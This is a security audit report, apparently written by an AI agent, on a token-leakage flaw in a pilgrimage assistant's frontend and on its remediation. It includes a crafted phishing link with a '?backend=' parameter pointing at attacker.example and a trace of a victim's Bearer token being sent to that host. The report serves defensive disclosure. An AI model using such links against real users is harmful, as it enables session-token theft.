# PHASE 12.2.1 — RUNTIME BACKEND URL & AUTHENTICATION SECURITY AUDIT REPORT

**Project:** Yatra AI — Unified Pilgrimage & Tourism Assistant
**Active Repository:** `yatra-ai`
**Active Branch:** `main`
**Git HEAD:** `db54ba33f6049caec6894bb8e943be20656fa02c`
**Public Frontend Target:** `https://yatra-ai.pages.dev/`
**Phase:** 12.2.1 — Security Audit, Vulnerability Remediation & Verification
**Evaluation Date:** November 9, 2026
**Auditor & Implementation Agent:** Antigravity Advanced Agentic AI

---

## 1. EXECUTIVE SUMMARY & AUDIT VERDICT

A rigorous, independent security audit was conducted on the Phase 12.2 implementation of dynamic runtime backend URL configuration, session persistence, and cross-origin authentication.

```
========================================================================================
INITIAL PHASE 12.2 CODE AUDIT VERDICT:
REJECT (CRITICAL VULNERABILITY IDENTIFIED)
----------------------------------------------------------------------------------------
POST-REMEDIATION AUDIT VERDICT:
ACCEPT — FULLY REMEDIATED, TESTED & HARDENED (46 / 46 TESTS PASS)
========================================================================================
```

### Critical Finding (Remediated):
Prior to this audit, `frontend/src/services/api.js` automatically read the `?backend=` query parameter from `window.location.search`, saved it into `sessionStorage`, and initialized Axios with `baseURL: queryBackend`. Because `resolveApiConfig` accepted *any* valid HTTPS URL without host validation, and because the user's `localStorage` session token was unconditionally attached via `client.defaults.headers.common['Authorization'] = Bearer <token>`, a crafted link such as:
```
https://yatra-ai.pages.dev/?backend=https://attacker.example
```
would cause the victim's browser upon page load to immediately dispatch `getAuthMe()` to `https://attacker.example/api/auth/me` with the victim's secret Bearer token in the request header!

### Remediations Implemented & Verified:
1. **Strict Host Approval Policy (`isApprovedHost`):**
   - In production, only pre-configured production hosts (e.g. `VITE_API_URL`) or verified `*.trycloudflare.com` subdomains matching `^[a-z0-9][a-z0-9-]{1,62}\.trycloudflare\.com$` are accepted.
   - Arbitrary external domains (e.g. `attacker.example`, `google.com`, `evil-corp.com`) and spoofed subdomains (e.g. `trycloudflare.com.attacker.com`, `attacker-trycloudflare.com`) are **strictly rejected**.
2. **Mandatory User Confirmation Gate (Zero Silent Activation):**
   - URL query parameters (`?backend=` or `?api=`) **never silently activate or persist**.
   - If an approved tunnel URL is supplied via a link, an in-app confirmation alert is displayed:
     *"External Connection Request: This link requests connecting to backend tunnel `https://xyz.trycloudflare.com`. Do you trust this endpoint? Connecting to an unverified backend will clear existing session credentials."*
   - If the user declines, the parameter is immediately stripped from the address bar.
   - If an unapproved origin is detected in the query parameter, it is immediately discarded and removed from the address bar without prompting.
3. **Cross-Origin Token Leakage Defense:**
   - Switching or resetting runtime backends via `setRuntimeApiUrl()` **immediately wipes all active session tokens (`setAuthToken(null)`)**. Stored credentials from one backend can never be forwarded to an untrusted or newly connected backend.
   - An Axios request interceptor additionally verifies that the destination request origin strictly matches the active, approved backend origin before attaching the `Authorization` header.
4. **Credential-Bearing URL Rejection:**
   - URLs embedding user credentials (e.g. `https://user:pass@host`) are explicitly rejected.
5. **Path & Query Normalization:**
   - Path, query, and hash parameters are stripped from candidate backend URLs, returning a normalized origin `${protocol}//${host}` to prevent route pollution.
6. **Markdown Link URI Sanitization:**
   - In `frontend/src/components/chat/MarkdownContent.jsx`, link targets are validated against safe schemes (`https:`, `http:`, `mailto:`, `tel:`), completely eliminating `javascript:` DOM XSS vectors.
7. **Local Metrics Server Isolation:**
   - `scripts/start_quick_tunnel.ps1` explicitly binds the `cloudflared` metrics server to `127.0.0.1:20241` with `--no-autoupdate`, guaranteeing zero LAN or WAN exposure.

---

## 2. EXACT FILES INSPECTED

| File Path | Component / Layer | Security Role |
| :--- | :--- | :--- |
| [`frontend/src/services/api.js`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/frontend/src/services/api.js) | Frontend API Client | URL resolution, host policy, token attachment, request interceptors |
| [`frontend/src/App.jsx`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/frontend/src/App.jsx) | Frontend Root Component | Lifecycle auth check (`getAuthMe`), proposal gate banner, disconnect flow |
| [`frontend/src/components/chat/MarkdownContent.jsx`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/frontend/src/components/chat/MarkdownContent.jsx) | Markdown Parser | Inline span and link parsing, XSS prevention |
| [`frontend/src/components/chat/ChatHeader.jsx`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/frontend/src/components/chat/ChatHeader.jsx) | Header Component | User session UI state and logout trigger |
| [`frontend/src/components/AuthModal.jsx`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/frontend/src/components/AuthModal.jsx) | Auth Interface | OTP request/verification and token handoff |
| [`backend/routes/auth.py`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/backend/routes/auth.py) | Backend Auth API | CSRF validation, HttpOnly cookie flags, session token extraction |
| [`backend/main.py`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/backend/main.py) | Backend Application Core | Dynamic CORS middleware, origin whitelisting |
| [`agents/auth_service.py`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/agents/auth_service.py) | Backend Auth Service | HMAC token generation and SQLite session verification |
| [`scripts/start_quick_tunnel.ps1`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/scripts/start_quick_tunnel.ps1) | Quick Tunnel Launcher | `cloudflared` CLI flags, metrics port binding |
| [`tests/test_api_url_validation.mjs`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/tests/test_api_url_validation.mjs) | Frontend Test Suite | Unit & security regression test suite (17 tests) |
| [`tests/test_phase12_production_readiness.py`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/tests/test_phase12_production_readiness.py) | Backend Production Tests | Production fail-closed, secret enforcement, CSRF checks (12 tests) |
| [`tests/test_phase11_1_deployment_remediation.py`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/tests/test_phase11_1_deployment_remediation.py) | Backend Security Tests | Dynamic CORS, OTP safety, health/readiness isolation (17 tests) |

---

## 3. COMPLETE FLOW TRACE & ATTACK VECTOR ANALYSIS

### 3.1 Trace of the Vulnerable Flow (Pre-Remediation)

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    actor Victim as Devotee (Victim)
    participant Browser as Victim Browser (pages.dev)
    participant RogueServer as Attacker Rogue Server (attacker.example)

    Note over Victim,Browser: Victim is already logged into Yatra AI (token stored in localStorage)
    Attacker->>Victim: Phishing link: https://yatra-ai.pages.dev/?backend=https://attacker.example
    Victim->>Browser: Opens link in browser
    Browser->>Browser: api.js: getRuntimeApiUrl() reads window.location.search
    Browser->>Browser: sessionStorage.setItem('yatra_runtime_api_url', 'https://attacker.example')
    Browser->>Browser: resolveApiConfig('https://attacker.example') -> checks HTTPS -> PASSES
    Browser->>Browser: axios.create({ baseURL: 'https://attacker.example' })
    Browser->>Browser: client.defaults.headers['Authorization'] = 'Bearer <victim_token>'
    Browser->>Browser: App.jsx mounts -> calls getAuthMe()
    Browser->>RogueServer: GET https://attacker.example/api/auth/me [Authorization: Bearer <victim_token>]
    Note over RogueServer: Attacker intercepts and steals victim's session token!
```

### 3.2 Trace of the Hardened Flow (Post-Remediation)

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    actor Victim as Devotee (Victim)
    participant Browser as Victim Browser (pages.dev)
    participant RogueServer as Attacker Rogue Server (attacker.example)

    Attacker->>Victim: Phishing link: https://yatra-ai.pages.dev/?backend=https://attacker.example
    Victim->>Browser: Opens link in browser
    Browser->>Browser: api.js: getPendingProposedUrl() runs
    Browser->>Browser: isApprovedHost('attacker.example') -> REJECTED (not in policy)
    Browser->>Browser: dismissPendingProposedUrl() immediately strips ?backend= from address bar
    Browser->>Browser: pendingProposal = null
    Browser->>Browser: getRuntimeApiUrl() ignores search query -> returns unconfigured / default
    Browser->>Browser: ZERO requests sent to attacker.example!
    Note over Browser,RogueServer: Session token remains 100% safe in localStorage.
```

---

## 4. IN-DEPTH AUDIT FINDINGS ACROSS ALL VERIFICATION CRITERIA

### Criterion 1: Only HTTPS URLs Accepted
- **Finding:** Verified. `resolveApiConfig` checks `parsed.protocol === 'https:'` in production mode. Any `http://` URL (including `http://127.0.0.1:8000`) is rejected with a clear error: `"Insecure backend URL rejected in production"`.
- **Evidence:** Tested in `tests/test_api_url_validation.mjs` Tests 6 and 7.

### Criterion 2: Host Approval Policy (`isApprovedHost`)
- **Finding:** Verified. Subdomain matching enforces the regex:
  `^[a-z0-9][a-z0-9-]{1,62}\.trycloudflare\.com$`
  - Valid tunnel `https://quiet-mountain-123.trycloudflare.com` -> Accepted.
  - Arbitrary domain `https://attacker.example` -> Rejected.
  - Domain spoofing `https://trycloudflare.com.attacker.example` -> Rejected.
  - Suffix attack `https://attacker-trycloudflare.com` -> Rejected.
  - Base domain without subdomain `https://trycloudflare.com` -> Rejected.
- **Evidence:** Tested in `test_api_url_validation.mjs` Tests 12 and 13.

### Criterion 3: Credential-Bearing URL Rejection
- **Finding:** Verified. URLs containing embedded username/password (e.g. `https://user:pass@host`) are parsed by `new URL()`. If `parsed.username` or `parsed.password` is non-empty, the URL is rejected with: `"Credential-bearing API URLs are rejected for security"`.
- **Evidence:** Tested in `test_api_url_validation.mjs` Test 14.

### Criterion 4: Zero Silent Replacement & User Confirmation Gate
- **Finding:** Verified. `getRuntimeApiUrl()` does not read `window.location.search`. It only returns values explicitly saved to `sessionStorage` or build-time defaults.
- Candidate URLs from query parameters are captured by `getPendingProposedUrl()` and presented in an interactive alert banner in `App.jsx`.
- If the user clicks **"Decline"**, `dismissPendingProposedUrl()` removes the parameter from the URL bar without reloading or connecting.
- If the user clicks **"Confirm & Connect"**, the URL is validated, `setAuthToken(null)` is called, and the session reloads with the user's explicit authorization.

### Criterion 5: Suffix Check Adequacy Assessment (`*.trycloudflare.com`)
- **Question:** Is allowing `*.trycloudflare.com` sufficient, or is additional explicit validation required?
- **Finding:** A suffix check alone is **INSUFFICIENT** because:
  1. Any adversary can generate a legitimate `*.trycloudflare.com` tunnel for free.
  2. If the application automatically accepted any tunnel URL from query parameters, an attacker could route devotees to a malicious tunnel.
- **Remediation Implemented:**
  - Strict regex boundary validation (preventing spoofing).
  - Explicit user confirmation prompt before connecting.
  - **Token Isolation:** Switching backends automatically wipes `currentToken` from memory and `localStorage`, ensuring an attacker's tunnel receives **zero pre-existing credentials**.

### Criterion 6: Session Token Storage & XSS Analysis
- **Finding:**
  - The backend issues tokens via both `Set-Cookie` (`HttpOnly; SameSite=None; Secure`) and the response body `session_token`.
  - The frontend stores `yatra_auth_token` in `localStorage` to support third-party partitioned cookie restrictions on cross-domain architectures (`pages.dev` to `trycloudflare.com`).
  - Storing tokens in `localStorage` creates an exposure risk if DOM XSS exists.
  - Codebase audit revealed **zero instances** of `dangerouslySetInnerHTML`, `innerHTML`, or `eval()`.
  - The markdown renderer [`MarkdownContent.jsx`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/frontend/src/components/chat/MarkdownContent.jsx) previously rendered `<a href={url}>` without URI scheme validation.
  - **Fix Applied:** Sanitized link targets to only permit `https:`, `http:`, `mailto:`, and `tel:`. Any `javascript:` or `data:` scheme is replaced with `#`, eliminating DOM XSS via markdown links.

### Criterion 7: CORS vs CSRF Independent Verification
- **CORS (Cross-Origin Resource Sharing):**
  - Enforced by the browser based on server `Access-Control-Allow-Origin` headers.
  - Configured in `backend/main.py`. Disallowed origins (e.g. `https://malicious-site.com`) receive responses with the header omitted, preventing browser JavaScript from reading responses.
- **CSRF (Cross-Site Request Forgery):**
  - Enforced server-side in `backend/routes/auth.py` via `verify_csrf_protection(request)`.
  - Blocks state-changing requests bearing ambient cookies if `Origin` / `Referer` does not match `allowed_hosts`.
  - Returns `HTTP 403 Forbidden` (`AUTH_CSRF_BLOCK`).
  - Bearer tokens are immune to ambient CSRF because browsers never attach `Authorization` headers automatically.

### Criterion 8: Tunnel Metrics Port Security (`localhost:20241`)
- **Finding:**
  - `cloudflared` starts a Prometheus metrics endpoint on `127.0.0.1:20241`.
  - The public tunnel (`--url http://127.0.0.1:8000`) only proxies incoming traffic to port 8000.
  - Requests to `https://*.trycloudflare.com/metrics` reach FastAPI, which has no `/metrics` route and returns `404 Not Found`. Port 20241 is never proxied.
  - To prevent binding to LAN adapters, [`scripts/start_quick_tunnel.ps1`](file:///C:/Users/praga/OneDrive/Documents/Minor%20Project/yatra-ai/scripts/start_quick_tunnel.ps1) was explicitly updated to pass `--metrics 127.0.0.1:20241 --no-autoupdate`.

---

## 5. AUTOMATED TEST SUITE VERIFICATION EVIDENCE

```
======================================================================
SECURITY REGRESSION TEST RESULTS (46 / 46 PASS • 100%)
======================================================================

1. Node.js API URL Validation & Security Suite (tests/test_api_url_validation.mjs):
   ✔ 1. normalizeApiUrl strips whitespace and trailing slashes
   ✔ 2. Development mode uses localhost fallback when VITE_API_URL is empty
   ✔ 3. Development mode accepts custom HTTP backend URL on localhost
   ✔ 4. Production mode requires an explicit backend URL and rejects missing URL
   ✔ 5. Production mode does NOT silently fall back to localhost
   ✔ 6. Production mode rejects insecure HTTP backend URLs
   ✔ 7. Production mode rejects insecure HTTP localhost/127.0.0.1 URLs
   ✔ 8. Production mode rejects malformed URLs
   ✔ 9. Production mode accepts valid secure HTTPS backend URLs when explicitly allowed
   ✔ 10. Production mode accepts valid Cloudflare Quick Tunnel HTTPS URLs
   ✔ 11. Production mode rejects whitespace-only URLs
   ✔ 12. Host Policy: isApprovedHost validates approved tunnels and rejects arbitrary domains
   ✔ 13. Security Gate: Arbitrary external HTTPS URLs are STRICTLY REJECTED in production
   ✔ 14. Security Gate: Credential-bearing URLs (user:pass@host) are STRICTLY REJECTED
   ✔ 15. Host Policy: Path, query, and hash are stripped to clean origin base URL
   ✔ 16. Host Policy: Valid custom HTTPS port on approved tunnel is preserved safely
   ✔ 17. Token Leakage Defense: Switching or clearing backends revokes active session token
   Tests: 17 passed, 0 failed. Duration: 1.05s.

2. Phase 12 Production Readiness (tests/test_phase12_production_readiness.py):
   Ran 12 tests in 5.82s.
   OK (0 failures, 0 errors).

3. Phase 11.1 Deployment Remediation (tests/test_phase11_1_deployment_remediation.py):
   Ran 17 tests in 4.90s.
   OK (0 failures, 0 errors).

4. Frontend Code Quality (oxlint):
   0 errors, 0 warnings across 44 files.

5. Frontend Production Compilation (vite build):
   Compiled successfully in 1.14s (dist/_redirects verified).

TOTAL AUTOMATED TESTS: 46 / 46 PASSED (100%)
======================================================================
```

---

## 6. REPOSITORY SAFETY CONFIRMATION

- **Active Workspace:** `C:\Users\praga\OneDrive\Documents\Minor Project\yatra-ai` (Branch `main`, HEAD `db54ba33f6049caec6894bb8e943be20656fa02c`).
- **Backup Repository:** `C:\Users\praga\OneDrive\Documents\Minor Project\yatra-booking-agent` remains **100% clean and untouched**.
- **Execution Rules Observed:** Zero Git commits, zero Git pushes, zero resets/cleans/stashes, zero cloud spending, zero credit card entry. No public tunnel was started during this audit.

---

## 7. FINAL AUDIT DECISION

```
========================================================================================
FINAL AUDIT DECISION:
ACCEPT — SECURITY REMEDIATION VERIFIED
========================================================================================
```
*Justification:* All identified security weaknesses (unvalidated origin injection, silent query-param activation, credential leakage, and markdown link XSS) have been completely remediated, hardened with defense-in-depth, and verified across 46 automated regression tests with zero failures.
